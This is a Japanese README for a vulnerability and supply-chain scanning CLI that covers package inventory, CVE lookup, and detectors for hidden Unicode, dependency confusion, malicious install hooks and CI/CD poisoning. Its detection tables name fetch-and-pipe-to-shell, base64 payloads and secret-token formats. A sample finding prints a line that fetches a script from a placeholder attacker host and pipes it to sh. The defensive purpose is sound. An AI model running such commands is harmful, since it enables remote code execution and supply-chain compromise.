# heretix-cli

[English README](README.md)

Linux/Windows サーバや Docker コンテナイメージの OS パッケージ（RPM, DPKG）および OSS エコシステム（PyPI, npm/yarn/pnpm）をスキャンし、脆弱性 API に問い合わせて既知の脆弱性を検出する CLI ツール。API なしで動作するローカルセキュリティ検知として、**GlassWorm**（不可視文字によるマルウェア混入）、**Dependency Confusion（Shai-hulud）**、**Malicious Install Scripts**（悪意ある install スクリプト）、**CI/CD Pipeline Poisoning**（パイプライン汚染）、**Lock File Integrity**（ロックファイル整合性）の検出に対応。

## 対応エコシステム

| エコシステム | スキャン対象 | 対応プラットフォーム |
|---|---|---|
| AlmaLinux / Oracle Linux / RHEL 系 (RPM) | `rpm -qa` / コンテナは `rpm --root <rootfs>` | Linux のみ |
| Debian / Ubuntu 系 (DPKG) | `var/lib/dpkg/status` を直接解析 | Linux のみ |
| Alpine (APK) | `/lib/apk/db/installed` を直接解析 | Linux のみ |
| PyPI | `requirements.txt`, `Pipfile.lock`, `poetry.lock`, `uv.lock` / フォールバック: `pip list` | Linux / Windows |
| npm / yarn / pnpm | `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml` / フォールバック: `npm list -g`, `pnpm list -g` | Linux / Windows |
| Go (go modules) | `go.mod` / フォールバック: `go list -m -json all` | Linux / Windows |
| Composer (PHP) | `composer.lock` | Linux / Windows |

## インストール

### ビルド

```bash
# Linux 向け静的バイナリ
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o heretix-cli .

# Windows 向けバイナリ
GOOS=windows GOARCH=amd64 go build -o heretix-cli.exe .
```

生成されたバイナリを対象サーバにコピーするだけでデプロイ完了。

### 依存パッケージ

```bash
go mod tidy
```

## 使い方

### パッケージ収集 (`collect`)

システムをスキャンし、インストール済みパッケージを JSON または CycloneDX SBOM に出力する。オフラインで実行可能。

```bash
heretix-cli collect
heretix-cli collect --output packages.json --scan-path /srv
heretix-cli collect --skip npm,pypi --verbose

# Docker イメージをスキャン
heretix-cli collect --image nginx:latest --output nginx-inventory.json
heretix-cli collect --image registry.example.com/myapp:v1.2 --output myapp-inventory.json

# Dockerfile の FROM ベースイメージも含めてスキャン
heretix-cli collect --image myapp:latest --dockerfile ./Dockerfile --output full-inventory.json

# CycloneDX SBOM (JSON) として出力
heretix-cli collect --format cyclonedx --output sbom.json
heretix-cli collect --image nginx:latest --format cyclonedx --output nginx-sbom.json
```

| フラグ | デフォルト | 説明 |
|---|---|---|
| `--output` | `inventory.json` | 出力ファイルパス |
| `--format` | `json` | 出力形式: `json`（heretix インベントリ）/ `cyclonedx`（CycloneDX BOM） |
| `--scan-path` | `/`（Linux）/ `%SystemDrive%\`（Windows） | ファイルシステムの探索ルートパス |
| `--skip` | (なし) | スキップするソース (例: `--skip npm`) |
| `--verbose` | `false` | 詳細ログ出力 |
| `--image` | (なし) | スキャンする Docker イメージ参照 (例: `nginx:latest`) |
| `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |

### 脆弱性チェック (`check`)

collect で出力した JSON を読み込み、脆弱性 API に問い合わせる。

```bash
heretix-cli check inventory.json
heretix-cli check inventory.json --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
heretix-cli check inventory.json --format json > results.json
```

| フラグ | デフォルト | 説明 |
|---|---|---|
| `--api-url` | `http://localhost:3001` | heretix-api の URL |
| `--api-key` | (なし) | API 認証キー（環境変数 `HERETIX_API_KEY` でも設定可） |
| `--format` | `table` | 出力形式: `table` / `json` |
| `--severity` | `0.0` | CVSS スコアの最小閾値 |
| `--concurrency` | `10` | 並行 API リクエスト数 |
| `--timeout` | `30s` | リクエストごとのタイムアウト |
| `--verbose` | `false` | 詳細ログ出力 |

### 一気通貫スキャン (`scan`)

collect と check をワンコマンドで実行する。中間ファイル不要。

```bash
# ライブシステムスキャン
heretix-cli scan
heretix-cli scan --scan-path /srv --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0

# Docker イメージスキャン
heretix-cli scan --image nginx:latest --api-url http://heretix-api:5000 --api-key your-secret-key
heretix-cli scan --image 123456789.dkr.ecr.ap-northeast-1.amazonaws.com/myapp:v1.2 --severity 7.0

# Dockerfile の FROM ベースイメージも含めて一括スキャン
heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile --api-url http://heretix-api:5000

# 環境変数で API キーを指定
HERETIX_API_KEY=your-secret-key heretix-cli scan --api-url http://heretix-api:5000
```

`--image` フラグ指定時は Docker デーモンをまず参照し、見つからない場合はレジストリから直接 pull します。レジストリ認証は `~/.docker/config.json` から自動読み込みされます（ECR, GCR, Docker Hub 対応）。

`--image` 指定時、生成される inventory.json の `hostname` はマシンのホスト名ではなく**イメージ参照**（例: `nginx:latest`）に設定されます。これにより、複数のイメージを heretix-management にインポートした際に各イメージが独立したアセットとして管理されます。

上記コマンドは `collect` と `check` の全フラグを継承する。

| フラグ | デフォルト | 説明 |
|---|---|---|
| `--image` | (なし) | スキャンする Docker イメージ参照 |
| `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |
| `--skip-local` | `false` | ローカルセキュリティ検知をスキップ（GlassWorm・Dependency Confusion・Malicious Install・CI/CD Poisoning・Lock File Integrity） |

### ローカル検知のみ実行 (`detect`)

脆弱性 API を使わず、ローカルセキュリティ検知だけを実行する。オフラインで動作可能。

```bash
heretix-cli detect
heretix-cli detect --scan-path /srv/myapp
heretix-cli detect --format json

# Docker イメージをスキャン
heretix-cli detect --image nginx:latest
heretix-cli detect --image myapp:latest --dockerfile ./Dockerfile
```

| フラグ | デフォルト | 説明 |
|---|---|---|
| `--scan-path` | `/`（Linux）/ `%SystemDrive%\`（Windows） | ファイルシステムの探索ルートパス |
| `--image` | (なし) | スキャンする Docker イメージ参照 |
| `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |
| `--format` | `table` | 出力形式: `table` / `json` |
| `--verbose` | `false` | 詳細ログ出力 |

## ローカルセキュリティ検知

`scan` および `detect` コマンドは、ネットワークアクセスを必要としない 5 種類のローカル検知を実行します。

Docker イメージスキャン（`--image`）時は、全検知器が OS のシステムディレクトリを自動スキップします（`/usr/share`、`/usr/lib/python*`、`/var/cache`、`/proc`、`/sys`、`/dev`、`/boot` 等）。これにより数百万件の無関係なファイルのスキャンを回避します。

### GlassWorm 検知

ソースファイル内の不可視・ゼロ幅 Unicode 文字を検出します。レビュアーには見えないが、インタープリタに実行される形でマルウェアを埋め込む攻撃に対応します。

| 文字 | Severity |
|---|---|
| U+202A–U+202E BiDi 制御文字（RLO, LRO 等） | CRITICAL |
| U+2028, U+2029 行区切り・段落区切り | HIGH |
| U+FEFF BOM（ファイル先頭以外） | HIGH |
| U+200B/C/D ゼロ幅スペース・結合子 | MEDIUM |
| U+2060, U+034F ワードジョイナー等 | MEDIUM |

対象ファイル: `*.py`, `*.js`, `*.ts`, `*.go`, `*.php`, `*.rb`, `*.json`, `*.lock`, `*.toml`, `*.cfg`

### Dependency Confusion 検知（Shai-hulud）

内部パッケージ名を公開レジストリに登録し、意図しない公開版がインストールされる攻撃（依存関係混乱攻撃）への脆弱な設定を検出します。

| チェック内容 | エコシステム | Severity |
|---|---|---|
| スコープパッケージ（`@scope/pkg`）に対応する `.npmrc` レジストリマッピングがない | npm | HIGH |
| `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml` でスコープパッケージが公開レジストリから解決されている | npm | HIGH |
| バージョン未固定（`^`, `~`, `*`） | npm | MEDIUM |
| `requirements.txt` / `pip.conf` に `--extra-index-url`（pip は全インデックスで最高バージョンを選択） | PyPI | HIGH |
| 範囲指定バージョン（`>=`, `~=`） | PyPI | MEDIUM |
| `--hash=sha256:` インテグリティチェックなし | PyPI | LOW |
| 公開 `GOPROXY` かつ内部モジュールパスを `GOPRIVATE` がカバーしていない | Go | HIGH |
| `go.mod` にあるモジュールが `go.sum` に存在しない | Go | MEDIUM |

### Malicious Install Scripts 検知

npm ライフサイクルフック（`preinstall`、`postinstall`、`prepare` 等）や Python `setup.py` 内の危険なコマンドを検出します。パッケージインストール時に自動実行されるため、サプライチェーン攻撃の主要な侵入経路です。

| チェック内容 | エコシステム | Severity |
|---|---|---|
| `curl`/`wget` の出力をシェルにパイプ（`\| sh`、`\| bash`） | npm / PyPI | CRITICAL |
| Base64 デコードしたペイロードをシェルに実行 | npm | CRITICAL |
| ネットワーク fetch した内容を `eval()` | npm | CRITICAL |
| install フックで `require('child_process')` をロード | npm | HIGH |
| ライフサイクルフック内のアウトバウンド `curl`/`wget` | npm | HIGH |
| `node -e '...'` によるインライン実行 | npm | HIGH |
| `setup.py` 内の `os.system()` または `subprocess.*()` | PyPI | HIGH |
| フック内の Base64 デコード（`Buffer.from(..., 'base64')`） | npm | MEDIUM |
| install フック内の `fetch()` アウトバウンド呼び出し | npm | MEDIUM |
| `setup.py` 内のネットワークリクエスト | PyPI | MEDIUM |

`package.json`（`node_modules/` 配下を含む）と `setup.py` を対象にスキャン。

### CI/CD Pipeline Poisoning 検知

ビルドパイプラインを乗っ取ったりシークレットを窃取するために使われる CI/CD 設定ファイルのパターンを検出します。

| チェック内容 | 対象システム | Severity |
|---|---|---|
| `curl`/`wget` の出力をシェルにパイプ | 全システム | CRITICAL |
| Base64 デコードしたペイロードをシェルに実行 | 全システム | CRITICAL |
| ユーザー制御の GitHub イベントデータを `run:` ステップに埋め込み（スクリプトインジェクション） | GitHub Actions | CRITICAL |
| パイプラインステップ内のアウトバウンド `curl`/`wget` | 全システム | HIGH |
| GitHub シークレット（`${{ secrets.* }}`）をステップで直接使用（ログ漏洩リスク） | GitHub Actions | HIGH |
| ミュータブルなブランチ参照へのアクション固定（`@main`、`@master`） | GitHub Actions | HIGH |
| `remote: https://` によるリモートパイプライン設定読み込み | GitLab CI | HIGH |
| `node -e` / `python -c` によるインライン実行 | 全システム | MEDIUM |
| フルコミット SHA ではなく semver タグへのアクション固定 | GitHub Actions | MEDIUM |

`.github/workflows/*.yml`、`Jenkinsfile`、`.gitlab-ci.yml`、`.circleci/config.yml`、`azure-pipelines.yml`、`bitbucket-pipelines.yml` を対象にスキャン。

### Hardcoded Secrets 検知

> **注: 一時的に無効化されています。** 検知ロジックは実装済みですが、現在は実行されません。

ソースコードや設定ファイルに直接コミットされた認証情報・API キーを、2 つの手法で検出します。

**既知フォーマットパターン**（コンテキスト不問でフラグ）:

| シークレット種別 | Severity |
|---|---|
| AWS Access Key ID（`AKIA...`） | CRITICAL |
| GitHub トークン（`ghp_`、`ghs_`、`gho_`、`github_pat_`） | CRITICAL |
| npm アクセストークン（`npm_...`） | CRITICAL |
| Slack トークン（`xox[baprs]-...`） | CRITICAL |
| Stripe Live シークレットキー（`sk_live_...`） | CRITICAL |
| SendGrid API キー（`SG....`） | CRITICAL |
| Google API キー（`AIza...`） | CRITICAL |
| Google OAuth クライアントシークレット（`GOCSPX-...`） | CRITICAL |
| PEM 秘密鍵ヘッダ | CRITICAL |
| JWT（JSON Web Token） | HIGH |
| Stripe テストシークレットキー（`sk_test_...`） | MEDIUM |

**エントロピー検知**: `api_key = "..."` や `token: "..."` などの代入パターンで値を抽出し、Shannon エントロピー ≥ 4.5 bits/文字 のものをフラグ。純粋な16進数文字列（コミットハッシュ等）は除外。

プレースホルダ値（`changeme`、`YOUR_KEY_HERE`、`<token>`、環境変数参照 `$MY_SECRET` 等）は自動除外。シークレット値は出力で `先頭6文字***` にマスクされ、ログへの認証情報漏洩を防止。

`.go`、`.py`、`.js`、`.ts`、`.rb`、`.php`、`.java`、`.cs`、`.sh`、`.bash`、`.env`、`.yaml`、`.yml`、`.toml`、`.json`、`.xml`、`.ini`、`.cfg`、`.conf`、`.properties`、`.tf` を対象にスキャン。`*.example`、`*.template`、`*_test.go`、`*.spec.ts` 等はスキップ。`target/`、`.next/`、`.nuxt/` も除外ディレクトリに追加。

### Lock File Integrity 検知

ロックファイルの弱いハッシュや欠落を検出し、マニフェストとロックファイルのドリフト（不整合）を確認します。

| チェック内容 | 対象ファイル | Severity |
|---|---|---|
| 直接依存が SHA-1 integrity を使用（衝突攻撃が可能な破損済みアルゴリズム） | `package-lock.json` | HIGH |
| `package.json` に宣言されているが `package-lock.json` に存在しない | `package-lock.json` | MEDIUM |
| `go.mod` の require にあるモジュールが `go.sum` に存在しない（未検証） | `go.sum` | MEDIUM |
| `Pipfile.lock` のパッケージにハッシュエントリがない（インストール時に整合性検証不可） | `Pipfile.lock` | MEDIUM |

## 出力例

### テーブル出力 (デフォルト)

```
Vulnerability Check Report
==========================
Source:     inventory.json
Host:       server01
Packages:   1523 checked (rpm: 1200, dpkg: 320, pip: 280, npm: 43)

  ECOSYSTEM   PACKAGE          VERSION    SOURCE                DB    VULN ID               CVSS   EPSS  SUMMARY
  ──────────  ───────────────  ─────────  ────────────────────  ───   ───────────────────   ────   ─────  ──────────────
! AlmaLinux   curl             7.88.1     rpm                   nvd   CVE-2024-1234          9.8   0.950  Remote code exec
  AlmaLinux   openssl          3.0.11     rpm                   osv   ALSA-2024:5678         7.5   0.123  Buffer overflow
  Debian      libssl3          3.0.11     dpkg                  nvd   CVE-2024-5678          7.5   0.098  Buffer overflow
  PyPI        requests         2.31.0     /srv/myapp/req...     osv   GHSA-xxxx-yyyy         6.1   0.045  SSRF via proxy
~ PyPI        somepkg          v2024.1    pip                   osv   GHSA-zzzz-zzzz         6.0       -  Some vulnerability
# npm         malicious-pkg    1.0.0      pnpm-lock.yaml        osv   MAL-2024-1234            -       -  Malicious package

# = malicious package (OSSF Malicious Packages)
! = in CISA Known Exploited Vulnerabilities (KEV) catalog
~ = approximate match (version could not be normalized, showing all vulnerabilities for this package)
DB = data source (osv = Open Source Vulnerabilities, nvd = NIST NVD, advisory = Vendor Advisory)
EPSS = Exploit Prediction Scoring System probability (0.000–1.000)

Summary: 14 packages with 21 findings (1 malware, 1 KEV)
  Malware:          1
  Critical (>=9.0): 1
  High (>=7.0):     4
  Medium (>=4.0):   8
  Low (<4.0):       5

Local Security Findings
=======================
  TYPE            FILE                                LINE  SEVERITY  DETAIL
  ─────────────── ─────────────────────────────────── ────  ────────  ────────────────────────────────────
G glassworm          /app/utils.py                         42  CRITICAL  invisible char U+202E (RIGHT-TO-LEFT OVERRIDE) detected
D dep-confusion      /app/.npmrc                            -  HIGH      scoped package @myco has no registry mapping in .npmrc
D dep-confusion      /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
M malicious-install  /app/package.json                      -  CRITICAL  postinstall: remote code download piped to shell — curl https://evil.example/install.sh | sh
C cicd-poisoning     /app/.github/workflows/ci.yml         12  HIGH      [github-actions] action pinned to mutable branch ref — uses: actions/checkout@main
L lockfile-integrity /app/package-lock.json                 -  HIGH      lodash: integrity uses SHA-1 (broken) — regenerate lockfile with npm ≥ 5 to get SHA-512

G = GlassWorm（不可視・ゼロ幅文字の混入）
D = Dependency Confusion（公開レジストリから解決可能な内部パッケージ）
M = Malicious Install（ライフサイクルフック内の危険なコマンド）
C = CI/CD Poisoning（パイプライン設定の攻撃パターン）
L = Lock File Integrity（弱いハッシュまたはマニフェスト／ロックファイルの不整合）

Local findings: 6 (1 glassworm, 2 dep-confusion, 1 malicious-install, 1 cicd-poisoning, 1 lockfile-integrity)
```

### JSON 出力 (`--format json`)

stdout に JSON のみ出力（脆弱性結果と `localFindings` フィールドのローカル検知結果を含む）。進捗ログは stderr に出力されるため、パイプ処理が可能。

## 終了コード

| コード | 意味 |
|---|---|
| `0` | 脆弱性・マルウェア・ローカル検知結果なし（collect の場合は成功） |
| `1` | 脆弱性、マルウェア、またはローカルセキュリティ検知結果あり（CI/CD 連携用） |
| `2` | 実行失敗 |

## CI/CD での利用例

### ライブシステムスキャン

```bash
export HERETIX_API_KEY=your-secret-key
heretix-cli scan --api-url http://heretix-api:5000 --severity 7.0 --format json > /dev/null
if [ $? -eq 1 ]; then
  echo "High severity vulnerabilities found!"
  exit 1
fi
```

### Docker イメージスキャン (ビルド後チェック)

```bash
docker build -t myapp:latest .
heretix-cli scan --image myapp:latest --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
```

### Dockerfile ベースイメージも含めた完全スキャン

```bash
heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile \
  --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0 --format json > vuln-report.json
```

## プロジェクト構成

```
heretix-cli/
├── main.go                 # エントリポイント
├── cmd/                    # CLI コマンド定義 (cobra)
├── collector/              # パッケージ収集 (Collector インターフェース)
├── container/              # Docker イメージ取得・展開
├── inventory/              # 検出リスト JSON スキーマ・I/O
├── checker/                # 脆弱性 API クライアント
├── detector/               # ローカルセキュリティ検知 (Detector インターフェース)
├── report/                 # テーブル・JSON 出力
└── sbom/                   # CycloneDX SBOM 生成
```

## 拡張

### 新しいエコシステムコレクターを追加するには

1. `collector/` に `Collector` インターフェースの実装を追加
2. `collector/collect.go` の `CollectAll` 内のリストに登録

### 新しいローカルセキュリティ検知を追加するには

1. `detector/` に `Detector` インターフェースの実装を追加
2. `detector/detector.go` の `RunAll` 内のリストに登録
